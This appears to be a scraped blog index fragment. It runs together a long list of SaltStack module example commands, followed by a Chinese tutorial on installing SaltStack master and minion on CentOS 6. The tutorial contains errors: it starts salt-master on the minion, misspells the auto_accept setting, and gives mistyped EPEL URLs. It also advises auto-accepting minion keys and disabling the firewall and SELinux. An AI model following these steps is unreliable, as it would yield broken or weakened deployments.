[“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_activate [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_disable node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_disable node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_disable [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_disable [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_recover node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_recover node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_recover [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_recover [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.bulk_stop node1,node2,node3 loadbalancer1salt ‘*’ modjk.bulk_stop node1,node2,node3 loadbalancer1 other-profilesalt ‘*’ modjk.bulk_stop [“node1″,”node2″,”node3″] loadbalancer1salt ‘*’ modjk.bulk_stop [“node1″,”node2″,”node3″] loadbalancer1 other-profilesalt ‘*’ modjk.dump_configsalt ‘*’ modjk.dump_config other-profilesalt ‘*’ modjk.get_runningsalt ‘*’ modjk.get_running other-profilesalt ‘*’ modjk.lb_edit loadbalancer1 “&#123;‘vlr': 1, ‘vlt': 60&#125;”salt ‘*’ modjk.lb_edit loadbalancer1 “&#123;‘vlr': 1, ‘vlt': 60&#125;” other-profilesalt ‘*’ modjk.list_configured_members loadbalancer1salt ‘*’ modjk.list_configured_members loadbalancer1 other-profilesalt ‘*’ modjk.recover_all loadbalancer1salt ‘*’ modjk.recover_all loadbalancer1 other-profilesalt ‘*’ modjk.reset_stats loadbalancer1salt ‘*’ modjk.reset_stats loadbalancer1 other-profilesalt ‘*’ modjk.versionsalt ‘*’ modjk.version other-profilesalt ‘*’ modjk.worker_activate node1 loadbalancer1salt ‘*’ modjk.worker_activate node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_disable node1 loadbalancer1salt ‘*’ modjk.worker_disable node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_edit node1 loadbalancer1 “&#123;‘vwf': 500, ‘vwd': 60&#125;”salt ‘*’ modjk.worker_edit node1 loadbalancer1 “&#123;‘vwf': 500, ‘vwd': 60&#125;” other-profilesalt ‘*’ modjk.worker_recover node1 loadbalancer1salt ‘*’ modjk.worker_recover node1 loadbalancer1 other-profilesalt ‘*’ modjk.worker_status node1salt ‘*’ modjk.worker_status node1 other-profilesalt ‘*’ modjk.worker_activate node1 loadbalancer1salt ‘*’ modjk.worker_activate node1 loadbalancer1 other-profilesalt ‘*’ modjk.workerssalt ‘*’ modjk.workers other-profilesalt ‘*’ mount.activesalt ‘*’ mount.fstabsalt ‘*’ mount.is_fuse_exec sshfssalt ‘*’ mount.is_mounted /mnt/sharesalt ‘*’ mount.mount /mnt/foo /dev/sdz1 Truesalt ‘*’ mount.remount /mnt/foo /dev/sdz1 Truesalt ‘*’ mount.rm_fstab /mnt/foosalt ‘*’ mount.set_fstab /mnt/foo /dev/sdz1 ext4salt ‘*’ mount.swapoff /root/swapfilesalt ‘*’ mount.swapon /root/swapfilesalt ‘*’ mount.swapssalt ‘*’ mount.umount /mnt/foosalt ‘*’ network.active_tcpsalt ‘*’ network.arpsalt ‘*’ network.connect archlinux.org 80salt ‘*’ network.connect archlinux.org 80 timeout=3salt ‘*’ network.connect archlinux.org 80 timeout=3 family=ipv4salt ‘*’ network.connect google-public-dns-a.google.com port=53 proto=udp timeout=3salt ‘*’ network.dig archlinux.orgsalt ‘*’ network.get_hostnamesalt ‘*’ network.hw_addr eth0salt ‘*’ network.hw_addr eth0salt ‘*’ network.in_subnet 10.0.0.0/16salt ‘*’ network.interface eth0salt ‘*’ network.interface_ip eth0salt ‘*’ network.interfacessalt ‘*’ network.ip_addrssalt ‘*’ network.ip_addrs6salt ‘*’ network.ip_addrssalt ‘*’ network.ip_addrs6salt ‘*’ network.is_loopback 127.0.0.1salt ‘*’ network.is_private 10.0.0.3salt ‘*’ network.mod_hostname master.saltstack.comsalt ‘*’ network.netstatsalt ‘*’ network.ping archlinux.orgsalt ‘*’ network.subnetssalt ‘*’ network.traceroute archlinux.orgsalt ‘*’ pillar.itemssalt ‘*’ pillar.ext ‘&#123;libvirt: _&#125;’salt ‘*’ pillar.get pkg:apachesalt ‘*’ pillar.item foosalt ‘*’ pillar.item foo bar bazsalt ‘*’ pillar.itemssalt ‘*’ pillar.rawsalt ‘*’ pillar.raw key=’roles’salt ‘*’ pip.freeze /home/code/path/to/virtualenv/salt ‘*’ pip.install &lt;package name&gt;,&lt;package2 name&gt;salt ‘*’ pip.install requirements=/path/to/requirements.txtsalt ‘*’ pip.install &lt;package name&gt; bin_env=/path/to/virtualenvsalt ‘*’ pip.install &lt;package name&gt; bin_env=/path/to/pip_binsalt ‘*’ pip.install markdown,django editable=git+https://github.com/worldcompany/djangoembed.git#egg=djangoembed upgrade=True no_deps=Truesalt ‘*’ pip.list saltsalt ‘*’ pip.uninstall &lt;package name&gt;,&lt;package2 name&gt;salt ‘*’ pip.uninstall requirements=/path/to/requirements.txtsalt ‘*’ pip.uninstall &lt;package name&gt; bin_env=/path/to/virtualenvsalt ‘*’ pip.uninstall &lt;package name&gt; bin_env=/path/to/pip_binsalt ‘*’ pip.versionsalt ‘*’ pkg.latest_version &lt;package name&gt;salt ‘*’ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt ‘*’ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt ‘*’ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt;salt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; fromrepo=epel-testingsalt ‘*’ pkg.check_db &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; disableexcludes=mainsalt ‘*’ pkg.clean_metadatasalt ‘*’ pkg.del_repo myreposalt ‘*’ pkg.del_repo myrepo basedir=/path/to/dirsalt ‘*’ pkg.file_list httpdsalt ‘*’ pkg.file_list httpd postfixsalt ‘*’ pkg.file_listsalt ‘*’ pkg.file_list httpdsalt ‘*’ pkg.file_list httpd postfixsalt ‘*’ pkg.file_listsalt ‘*’ pkg.get_locked_packagessalt ‘*’ pkg.get_repo myreposalt ‘*’ pkg.get_repo myrepo basedir=/path/to/dirsalt ‘*’ pkg.group_diff ‘Perl Support’salt ‘*’ pkg.group_info ‘Perl Support’salt ‘*’ pkg.group_install ‘Group 1′salt ‘*’ pkg.group_install ‘Group 1,Group 2′salt ‘*’ pkg.group_install ‘[“Group 1″, “Group 2″]’salt ‘*’ pkg.group_install ‘My Group’ skip=’foo,bar’salt ‘*’ pkg.group_install ‘My Group’ skip='[“foo”, “bar”]’salt ‘*’ pkg.group_install ‘My Group’ include=’foo,bar’salt ‘*’ pkg.group_install ‘My Group’ include='[“foo”, “bar”]’salt ‘*’ pkg.group_listsalt ‘*’ pkg.hold &lt;package name&gt;salt ‘*’ pkg.hold pkgs='[“foo”, “bar”]’salt ‘*’ pkg.install &lt;package name&gt;salt ‘*’ pkg.install pkgs='[“foo”, “bar”]’salt ‘*’ pkg.install pkgs='[“foo”, &#123;“bar”: “1.2.3-4.el5″&#125;]’salt ‘*’ pkg.install sources='[&#123;“foo”: “salt://foo.rpm”&#125;, &#123;“bar”: “salt://bar.rpm”&#125;]’salt ‘*’ pkg.latest_version &lt;package name&gt;salt ‘*’ pkg.latest_version &lt;package name&gt; fromrepo=epel-testingsalt ‘*’ pkg.latest_version &lt;package name&gt; disableexcludes=mainsalt ‘*’ pkg.latest_version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg.list_pkgssalt ‘*’ pkg.list_repo_pkgssalt ‘*’ pkg.list_repo_pkgs foo bar bazsalt ‘*’ pkg.list_repo_pkgs ‘samba4*’ fromrepo=base,updatessalt ‘*’ pkg.list_repossalt ‘*’ pkg.list_upgradessalt ‘*’ pkg.mod_repo reponame enabled=1 gpgcheck=1salt ‘*’ pkg.mod_repo reponame basedir=/path/to/dir enabled=1salt ‘*’ pkg.mod_repo reponame baseurl= mirrorlist=http://host.com/salt ‘*’ pkg.normalize_name zsh.x86_64salt ‘*’ pkg.owner /usr/bin/apachectlsalt ‘*’ pkg.owner /usr/bin/apachectl /etc/httpd/conf/httpd.confsalt ‘*’ pkg.purge &lt;package name&gt;salt ‘*’ pkg.purge &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt ‘*’ pkg.purge pkgs='[“foo”, “bar”]’salt ‘*’ pkg.refresh_dbsalt ‘*’ pkg.remove &lt;package name&gt;salt ‘*’ pkg.remove &lt;package1&gt;,&lt;package2&gt;,&lt;package3&gt;salt ‘*’ pkg.remove pkgs='[“foo”, “bar”]’salt ‘*’ pkg.unhold &lt;package name&gt;salt ‘*’ pkg.unhold pkgs='[“foo”, “bar”]’salt ‘*’ pkg.upgradesalt ‘*’ pkg.upgrade_available &lt;package name&gt;salt ‘*’ pkg.verifysalt ‘*’ pkg.verify httpdsalt ‘*’ pkg.verify ‘httpd postfix’salt ‘*’ pkg.verify ‘httpd postfix’ ignore_types=[‘config’,’doc’]salt ‘*’ pkg.version &lt;package name&gt;salt ‘*’ pkg.version &lt;package1&gt; &lt;package2&gt; &lt;package3&gt; …salt ‘*’ pkg_resource.add_pkg ‘&#123;&#125;’ bind 9salt ‘*’ pkg_resource.check_extra_requirements &lt;pkgname&gt; &lt;extra_requirements&gt;salt ‘*’ pkg_resource.pack_sources ‘[&#123;“foo”: “salt://foo.rpm”&#125;, &#123;“bar”: “salt://bar.rpm”&#125;]’salt ‘*’ pkg_resource.parse_targetssalt ‘*’ pkg_resource.sort_pkglist ‘[“3.45″, “2.13”]’salt ‘*’ pkg_resource.stringify ‘vim: 7.127′salt ‘*’ pkg_resource.version vimsalt ‘*’ pkg_resource.version foo bar bazsalt ‘*’ pkg_resource.version ‘python*’salt ‘*’ pkg_resource.version_clean &lt;version_string&gt;salt ‘*’ publish.full_data test.kwarg arg=’cheese=spam’salt ‘*’ publish.publish test.kwarg arg=’cheese=spam’salt ‘*’ pyenv.defaultsalt ‘*’ pyenv.default 2.0.0-p0salt ‘*’ pyenv.do ‘gem list bundler’salt ‘*’ pyenv.do ‘gem list bundler’ deploysalt ‘*’ pyenv.do_with_python 2.0.0-p0 ‘gem list bundler’salt ‘*’ pyenv.do_with_python 2.0.0-p0 ‘gem list bundler’ deploysalt ‘*’ pyenv.installsalt ‘*’ pyenv.install_python 2.0.0-p0salt ‘*’ pyenv.is_installedsalt ‘*’ pyenv.listsalt ‘*’ pyenv.rehashsalt ‘*’ pyenv.uninstall_python 2.0.0-p0salt ‘*’ pyenv.updatesalt ‘*’ pyenv.versionssalt ‘*’ raid.assemble /dev/md0 [‘/dev/xvdd’, ‘/dev/xvde’]salt ‘*’ raid.create /dev/md0 level=1 chunk=256 devices=”[‘/dev/xvdd’, ‘/dev/xvde’]” test_mode=Truesalt ‘*’ raid.detail /dev/md0salt ‘*’ raid.destroy /dev/md0salt ‘*’ raid.detail ‘/dev/md0′salt ‘*’ raid.listsalt ‘*’ raid.save_configsalt ‘*’ random.get_str 128salt ‘*’ random.hash ‘I am a string’ md5salt ‘*’ random.shadow_hash ‘My5alT’ ‘MyP@asswd’ md5salt ‘*’ random.str_encode ‘I am a new string’ base64salt ‘*’ rbenv.defaultsalt ‘*’ rbenv.default 2.0.0-p0salt ‘*’ rbenv.do ‘gem list bundler’salt ‘*’ rbenv.do ‘gem list bundler’ deploysalt ‘*’ rbenv.do_with_ruby 2.0.0-p0 ‘gem list bundler’salt ‘*’ rbenv.do_with_ruby 2.0.0-p0 ‘gem list bundler’ deploysalt ‘*’ rbenv.installsalt ‘*’ rbenv.install_ruby 2.0.0-p0salt ‘*’ rbenv.is_installedsalt ‘*’ rbenv.listsalt ‘*’ rbenv.rehashsalt ‘*’ rbenv.uninstall_ruby 2.0.0-p0salt ‘*’ rbenv.updatesalt ‘*’ rbenv.versionssalt ‘*’ ret.get_fun mysql network.interfacessalt ‘*’ ret.get_jid redis 20421104181954700505salt ‘*’ ret.get_jids mysqlsalt ‘*’ ret.get_minions mysqlsalt ‘*’ rsync.configsalt ‘*’ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;update=True&#125; &#123;passwordfile=/etc/pass.crt&#125; &#123;exclude=xx&#125;salt ‘*’ rsync.rsync &#123;src&#125; &#123;dst&#125; &#123;delete=True&#125; &#123;excludefrom=/xx.ini&#125;salt ‘*’ rsync.versionsalt ‘*’ rvm.do 2.0.0 &lt;command&gt;salt ‘*’ rvm.gemset_copy foobar bazquosalt ‘*’ rvm.gemset_create 2.0.0 foobarsalt ‘*’ rvm.gemset_delete 2.0.0 foobarsalt ‘*’ rvm.gemset_empty 2.0.0 foobarsalt ‘*’ rvm.gemset_listsalt ‘*’ rvm.gemset_list_allsalt ‘*’ rvm.getsalt ‘*’ rvm.installsalt ‘*’ rvm.install_ruby 1.9.3-p385salt ‘*’ rvm.is_installedsalt ‘*’ rvm.listsalt ‘*’ rvm.reinstall_ruby 1.9.3-p385salt ‘*’ rvm.rubygems 2.0.0 1.8.24salt ‘*’ rvm.set_default 2.0.0salt ‘*’ rvm.wrapper &lt;ruby_string&gt; &lt;wrapper_prefix&gt;salt ‘*’ saltutil.clear_cachesalt ‘*’ saltutil.cmdsalt ‘*’ saltutil.cmdsalt ‘*’ saltutil.find_cached_job &lt;job id&gt;salt ‘*’ saltutil.find_job &lt;job id&gt;salt ‘*’ saltutil.is_running state.highstatesalt ‘*’ saltutil.kill_job &lt;job id&gt;salt ‘*’ saltutil.mmodule base test.pingsalt ‘*’ saltutil.refresh_modulessalt ‘*’ saltutil.refresh_pillarsalt ‘*’ saltutil.regen_keyssalt ‘*’ saltutil.revoke_authsalt ‘*’ saltutil.runner jobs.list_jobssalt ‘*’ saltutil.runningsalt ‘*’ saltutil.signal_job &lt;job id&gt; 15salt ‘*’ saltutil.sync_allsalt ‘*’ saltutil.sync_grainssalt ‘*’ saltutil.sync_modulessalt ‘*’ saltutil.sync_outputterssalt ‘*’ saltutil.sync_rendererssalt ‘*’ saltutil.sync_returnerssalt ‘*’ saltutil.sync_statessalt ‘*’ saltutil.sync_utilssalt ‘*’ saltutil.term_job &lt;job id&gt;salt ‘*’ saltutil.updatesalt ‘*’ saltutil.update 0.10.3salt ‘*’ saltutil.wheel key.accept match=jerrysalt ‘*’ schedule.add job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.build_schedule_item job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.delete job1salt ‘*’ schedule.disablesalt ‘*’ schedule.disable_job job1salt ‘*’ schedule.enablesalt ‘*’ schedule.enable_job job1salt ‘*’ schedule.listsalt ‘*’ schedule.list show_all=Truesalt ‘*’ schedule.modify job1 function=’test.ping’ seconds=3600salt ‘*’ schedule.purgesalt ‘*’ schedule.reloadsalt ‘*’ schedule.run_job job1salt ‘*’ schedule.run_job job1 force=Truesalt ‘*’ schedule.savesalt ‘minion’ seed.apply path id [config=config_data] \\salt ‘minion’ seed.mkconfig [config=config_data] [tmp=tmp_dir] \\salt ‘*’ serverdensity_device.create lamasalt ‘*’ serverdensity_device.create rich_lama group=lama_band installedRAM=32768salt ‘*’ serverdensity_device.delete 51f7eafcdba4bb235e000ae4salt ‘*’ serverdensity_device.get_sd_auth &lt;val&gt;salt ‘*’ serverdensity_device.install_agent c2bbdd6689ff46282bdaa07555641498salt ‘*’ serverdensity_device.lssalt ‘*’ serverdensity_device.ls name=lamasalt ‘*’ serverdensity_device.ls name=lama group=lama_band installedRAM=32768salt ‘*’ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=lama group=lama_bandsalt ‘*’ serverdensity_device.update 51f7eafcdba4bb235e000ae4 name=better_lama group=rock_lamas swapSpace=512salt ‘*’ service.available sshdsalt ‘*’ service.available sshd limit=upstartsalt ‘*’ service.available sshd limit=sysvinitsalt ‘*’ service.disable &lt;service name&gt;salt ‘*’ service.disabled &lt;service name&gt;salt ‘*’ service.enable &lt;service name&gt;salt ‘*’ service.enabled &lt;service name&gt;salt ‘*’ service.get_allsalt ‘*’ service.get_all limit=upstartsalt ‘*’ service.get_all limit=sysvinitsalt ‘*’ service.get_disabledsalt ‘*’ service.get_disabled limit=upstartsalt ‘*’ service.get_disabled limit=sysvinitsalt ‘*’ service.get_enabledsalt ‘*’ service.get_enabled limit=upstartsalt ‘*’ service.get_enabled limit=sysvinitsalt ‘*’ service.missing sshdsalt ‘*’ service.missing sshd limit=upstartsalt ‘*’ service.missing sshd limit=sysvinitsalt ‘*’ service.reload &lt;service name&gt;salt ‘*’ service.restart &lt;service name&gt;salt ‘*’ service.start &lt;service name&gt;salt ‘*’ service.status &lt;service name&gt;salt ‘*’ service.stop &lt;service name&gt;salt ‘*’ shadow.default_hashsalt ‘*’ shadow.del_password usernamesalt ‘*’ shadow.gen_password ‘I_am_password’salt ‘*’ shadow.gen_password ‘I_am_password’ crypt_salt’I_am_salt’ algorithm=sha256salt ‘*’ shadow.info rootsalt ‘*’ shadow.set_date username 0salt ‘*’ shadow.set_expire username -1salt ‘*’ shadow.set_inactdays username 7salt ‘*’ shadow.set_maxdays username 90salt ‘*’ shadow.set_mindays username 7salt ‘*’ shadow.set_password root ‘$1$UYCIxa628.9qXjpQCjM4a..’salt ‘*’ shadow.set_warndays username 7salt ‘*’ sqlite3.fetch /root/test.db ‘SELECT * FROM test;’salt ‘*’ sqlite3.indexes /root/test.dbsalt ‘*’ sqlite3.indices /root/test.dbsalt ‘*’ sqlite3.modify /root/test.db ‘CREATE TABLE test(id INT, testdata TEXT);’salt ‘*’ sqlite3.sqlite_versionsalt ‘*’ sqlite3.tables /root/test.dbsalt ‘*’ sqlite3.versionsalt ‘*’ ssh.auth_keys rootsalt ‘*’ ssh.check_key &lt;user&gt; &lt;key&gt; &lt;enc&gt; &lt;comment&gt; &lt;options&gt;salt ‘*’ root salt://ssh/keyfilesalt ‘*’ ssh.check_known_host &lt;user&gt; &lt;hostname&gt; key=’AAAA…FAaQ==’salt ‘*’ ssh.get_known_host &lt;user&gt; &lt;hostname&gt;salt ‘*’ ssh.hash_known_hostssalt ‘*’ ssh.host_keyssalt ‘*’ ssh.recv_known_host &lt;hostname&gt; enc=&lt;enc&gt; port=&lt;port&gt;salt ‘*’ ssh.rm_auth_key &lt;user&gt; &lt;key&gt;salt ‘*’ ssh.rm_known_host &lt;user&gt; &lt;hostname&gt;salt ‘*’ ssh.set_auth_key &lt;user&gt; ‘&lt;key&gt;’ enc=’dsa’salt ‘*’ ssh.set_auth_key_from_file &lt;user&gt; salt://ssh_keys/&lt;user&gt;.id_rsa.pubsalt ‘*’ ssh.set_known_host &lt;user&gt; fingerprint=’xx:xx:..:xx’ enc=’ssh-rsa’ config=’.ssh/known_hosts’salt ‘*’ ssh.user_keyssalt ‘*’ ssh.user_keys user=user1salt ‘*’ ssh.user_keys user=user1 pubfile=/home/user1/.ssh/id_rsa.pub prvfile=/home/user1/.ssh/id_rsasalt ‘*’ ssh.user_keys user=”[‘user1′,’user2′] pubfile=id_rsa.pub prvfile=id_rsasalt ‘*’ state.clear_cachesalt ‘*’ state.high ‘&#123;“vim”: &#123;“pkg”: [“installed”]&#125;&#125;’salt ‘*’ state.highstatesalt ‘*’ state.highstate whitelist=sls1_to_run,sls2_to_runsalt ‘*’ state.highstate exclude=sls_to_excludesalt ‘*’ state.highstate exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ state.highstate pillar=”&#123;foo: ‘Foo!’, bar: ‘Bar!’&#125;”salt ‘*’ state.low ‘&#123;“state”: “pkg”, “fun”: “installed”, “name”: “vi”&#125;’salt ‘*’ state.pkg /tmp/state_pkg.tgzsalt ‘*’ state.runningsalt ‘*’ state.show_highstatesalt ‘*’ state.show_low_sls foosalt ‘*’ state.show_lowstatesalt ‘*’ state.show_sls core,edit.vim devsalt ‘*’ state.show_topsalt ‘*’ state.single pkg.installed name=vimsalt ‘*’ state.sls core,edit.vim devsalt ‘*’ state.sls core exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ state.sls myslsfile pillar=”&#123;foo: ‘Foo!’, bar: ‘Bar!’&#125;”salt ‘*’ state.sls_id apache httpsalt ‘*’ state.template ‘&lt;Path to template on the minion&gt;’salt ‘*’ state.template_str ‘&lt;Template String&gt;’salt ‘*’ state.top reverse_top.slssalt ‘*’ state.top reverse_top.sls exclude=sls_to_excludesalt ‘*’ state.top reverse_top.sls exclude=”[&#123;‘id': ‘id_to_exclude’&#125;, &#123;‘sls': ‘sls_to_exclude’&#125;]”salt ‘*’ status.all_statussalt ‘*’ status.cpuinfosalt ‘*’ status.cpustatssalt ‘*’ status.customsalt ‘*’ status.diskstatssalt ‘*’ status.diskusage [paths and/or filesystem types]salt ‘*’ status.diskusage # usage for all filesystemssalt ‘*’ status.diskusage / /tmp # usage for / and /tmpsalt ‘*’ status.diskusage ext? # usage for ext[234] filesystemssalt ‘*’ status.diskusage / ext? # usage for / and all ext filesystemssalt ‘*’ status.loadavgsalt ‘*’ status.mastersalt ‘*’ status.meminfosalt ‘*’ status.netdevsalt ‘*’ status.netstatssalt ‘*’ status.nprocsalt ‘*’ status.pid &lt;sig&gt;salt ‘*’ status.procssalt ‘*’ status.uptimesalt ‘*’ status.versionsalt ‘*’ status.vmstatssalt ‘*’ status.wsalt ‘*’ supervisord.add &lt;name&gt;salt ‘*’ supervisord.custom “mstop ‘*gunicorn*'”salt ‘*’ supervisord.options foosalt ‘*’ supervisord.remove &lt;name&gt;salt ‘*’ supervisord.rereadsalt ‘*’ supervisord.restart &lt;service&gt;salt ‘*’ supervisord.restart &lt;group&gt;:salt ‘*’ supervisord.start &lt;service&gt;salt ‘*’ supervisord.start &lt;group&gt;:salt ‘*’ supervisord.statussalt ‘*’ supervisord.status_rawsalt ‘*’ supervisord.stop &lt;service&gt;salt ‘*’ supervisord.stop &lt;group&gt;:salt ‘*’ supervisord.updatesalt ‘*’ sys.argspec pkg.installsalt ‘*’ sys.argspec syssalt ‘*’ sys.argspecsalt ‘*’ sys.docsalt ‘*’ sys.doc syssalt ‘*’ sys.doc sys.docsalt ‘*’ sys.doc network.traceroute user.infosalt ‘*’ sys.list_functionssalt ‘*’ sys.list_functions syssalt ‘*’ sys.list_functions sys usersalt ‘*’ sys.list_modulessalt ‘*’ sys.list_returner_functionssalt ‘*’ sys.list_returner_functions mysqlsalt ‘*’ sys.list_returner_functions mysql etcdsalt ‘*’ sys.list_returnerssalt ‘*’ sys.list_runner_functionssalt ‘*’ sys.list_runner_functions statesalt ‘*’ sys.list_runner_functions state virtsalt ‘*’ sys.list_runnerssalt ‘*’ sys.list_state_functionssalt ‘*’ sys.list_state_functions filesalt ‘*’ sys.list_state_functions pkg usersalt ‘*’ sys.list_state_modulessalt ‘*’ sys.reload_modulessalt ‘*’ sys.returner_docsalt ‘*’ sys.returner_doc sqlite3salt ‘*’ sys.returner_doc sqlite3.get_funsalt ‘*’ sys.returner_doc sqlite3.get_fun etcd.get_funsalt ‘*’ sys.runner_docsalt ‘*’ sys.runner_doc cachesalt ‘*’ sys.runner_doc cache.grainssalt ‘*’ sys.runner_doc cache.grains mine.getsalt ‘*’ sys.state_docsalt ‘*’ sys.state_doc servicesalt ‘*’ sys.state_doc service.runningsalt ‘*’ sys.state_doc service.running ipables.appendsalt ‘*’ sysctl.assign net.ipv4.ip_forward 1salt ‘*’ sysctl.get net.ipv4.ip_forwardsalt ‘*’ sysctl.persist net.ipv4.ip_forward 1salt ‘*’ sysctl.showsalt ‘*’ system.haltsalt ‘*’ system.init 3salt ‘*’ system.poweroffsalt ‘*’ system.rebootsalt ‘*’ system.shutdownsalt ‘*’ test.arg 1 “two” 3.1 txt=”hello” wow='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.arg_repr 1 “two” 3.1 txt=”hello” wow='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.arg_type 1 ‘int’salt ‘*’ test.collatz 3salt ‘*’ test.conf_testsalt ‘*’ test.cross_test file.gid_to_group 0salt ‘*’ test.echo ‘foo bar baz quo qux’salt ‘*’ test.exception ‘Oh noes!’salt ‘*’ test.fib 3salt ‘*’ test.get_optssalt ‘*’ test.kwarg num=1 txt=”two” env='&#123;a: 1, b: “hello”&#125;’salt ‘*’ test.not_loadedsalt ‘*’ test.opts_pkgsalt ‘*’ test.outputter foobarsalt ‘*’ test.pingsalt ‘*’ test.provider servicesalt ‘*’ test.providerssalt ‘*’ test.rand_sleep 60salt ‘*’ test.rand_strsalt ‘*’ test.retcode 42salt ‘*’ test.sleep 20salt ‘*’ test.stacksalt ‘*’ test.tty tty0 ‘This is a test’salt ‘*’ test.tty pts3 ‘This is a test’salt ‘*’ test.versionsalt ‘*’ test.versions_informationsalt ‘*’ test.versions_reportsalt ‘*’ timezone.get_hwclocksalt ‘*’ timezone.get_offsetsalt ‘*’ timezone.get_zonesalt ‘*’ timezone.get_zonecodesalt ‘*’ timezone.set_hwclock UTCsalt ‘*’ timezone.set_zone ‘America/Denver’salt ‘*’ timezone.zone_compare ‘America/Denver’salt ‘*’ user.add name &lt;uid&gt; &lt;gid&gt; &lt;groups&gt; &lt;home&gt; &lt;shell&gt;salt ‘*’ user.chfullname foo “Foo Bar”salt ‘*’ user.chgid foo 4376salt ‘*’ user.chgroups foo wheel,root Truesalt ‘*’ user.chhome foo /home/users/foo Truesalt ‘*’ user.chhomephone foo “7735551234”salt ‘*’ user.chroomnumber foo 123salt ‘*’ user.chshell foo /bin/zshsalt ‘*’ user.chuid foo 4376salt ‘*’ user.chworkphone foo “7735550123”salt ‘*’ user.delete name remove=True force=Truesalt ‘*’ user.getentsalt ‘*’ user.info rootsalt ‘*’ user.list_groups foosalt ‘*’ user.list_userssalt ‘*’ virtualenv.create /path/to/new/virtualenvsalt ‘*’ virtualenv.get_site_packages /path/to/my/venvsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpasswordsalt ‘*’ webutil.useradd /etc/httpd/htpasswd larry badpass opts=nssalt ‘*’ webutil.userdel /etc/httpd/htpasswd larry","link":"/2015/12/10/自动化+Jenkins/saltstack/服务自动化部署平台之Saltstack总结/"},{"title":"自动化运维工具--Saltstack安装部署配置使用","text":"自动化运维工具–Saltstack安装部署配置使用前言： 开始学saltstack的时候是在现在一家做CDN云加速的那是在2014年，salt刚刚出来所以我觉得我接触应该也算早的。 使用最多的同步下发的用到这个工具，下面我简单介绍和操作给大家看下。Salt 和 Puppet Chef 一样可以让你同时在多台服务器上执行命令也包括安装和配置软件。 Salt 有两个主要的功能：配置管理和远程执行。 Saltstack是一个大型分布式的配置管理系统（安装升级卸载软件，检测环境），也是一个远程命令执行系统。通过c/s的模型实现。服务器端对远程客户机的操作： ###（一）部署虚拟化环境 （1）两组服务器进行，操作系统版本为Centos release 6.4 RHEL 也可以。 （2）安装这个先安装下epel 由于现在网络RHEL官网yum源还没有 saltstack的安装包支持。因此先安装epel作为部署saltstack的默认yum源。 CenOs 5 版本: rpm -Uvh 下载地址：http://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-5-4.noarch.rpm CenOs 6 版本: rpm -Uvh 下载地址：http://ftp.linux.ncsu.edu/pud/epel/6/i386/epel-release-6-8.noarch.rpm 百度云也可以去下载，我的是centos 64位的 http://pan.baidu.com/s/1eQGWboI (1) 主服务器 （主控端） IP：192.168.23.21 1234#rpm -ivh http://mirrors.sohu.com/fedora-epel/6/x86_64/epel-release-6-8.noarch.rpm#yum install salt-master -y （安装salt-master）#chkconfig salt-master on#service salt-master start (2)从服务器安装 （被控端）IP：192.168.23.24 123#yum install salt-minion -y （安装salt-minion）#chkconfig salt-master on#service salt-master start 到这里已经安装完成。 Saltstack 防火墙配置 在主控端添加TCP 4505,TCP 4506 的规则，而在被控端无须配置防火墙，原理是被控端直接与主控端的zeromp建立链接。 接收 广播道任务信息并执行，具体操作是添加两条iptables规则： 12-A INPUT -m state --state new -m tcp -p tcp --dport 4505 -j ACCEPT-A INPUT -m state --state new -m tcp -p tcp --dport 4506 -j ACCEPT 默认配置文件位于/etc/salt/master ，默认不需要更改该配置文件。master端有两个端口需要在iptables上放行. 部署要求：两台机器网络互通，最好关闭防火墙。关闭selinux. 在启动下服务。 更新Saltstack 配置及安装效验。 Saltsatack 分两种，一种为master (主控制)，另一端为minion (被控端)，安装完毕后需要对两种角色的配置文件进行修改。 具体说明如下： （1） master 主控端配置 123456789 vim /etc/salt/master # 绑定Master 通信IP； interface :192.168.23.21 #自动认证，避免手动运行salt-key 来确认证书信任； auto-accept:True 修改/etc/hosts主机要添加被控机器的IP 和主机名192.168.23.24 xx.rix.com 服务端配置 主控端基本设置 编辑配置文件 /etc/salt/master,修改如下所示配置项，去掉前面的注释符 123interface: 192.168.23.21log_file: /var/log/salt/master # 记录主控端运行日志key_logfile: /var/log/salt/key # 记录认证证书日志 客户端配置 修改/etc/hosts 主机要添加服务端机器的IP 和主机名 1192.168.23.21 salt 受控端基本设置 编辑配置文件 /etc/salt/minion,修改如下所示配置项，去掉前面的注释符# 1234master: 192.168.23.21 # 设置主控端这里master设置主控端可以hosts名称：#master: salt前提是要设置hosts. 